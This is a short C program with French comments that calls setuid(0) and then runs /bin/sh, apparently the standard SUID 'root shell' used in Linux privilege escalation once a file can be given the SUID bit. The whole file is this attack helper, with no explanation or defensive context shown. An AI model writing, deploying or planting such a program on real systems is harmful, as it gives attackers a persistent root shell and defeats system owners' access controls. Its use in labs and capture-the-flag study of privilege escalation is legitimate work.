#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);  // Devient root (à cause du SUID)
    system("/bin/sh");  // Shell root
    return 0;
}

